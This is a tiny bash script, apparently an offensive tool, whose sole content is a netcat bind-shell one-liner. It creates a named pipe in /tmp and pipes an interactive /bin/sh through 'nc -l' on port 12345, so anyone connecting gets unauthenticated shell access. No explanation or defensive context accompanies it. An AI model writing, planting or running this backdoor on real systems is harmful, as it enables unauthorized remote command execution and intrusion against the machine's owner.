#!/bin/bash

port=12345

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l $port >/tmp/f
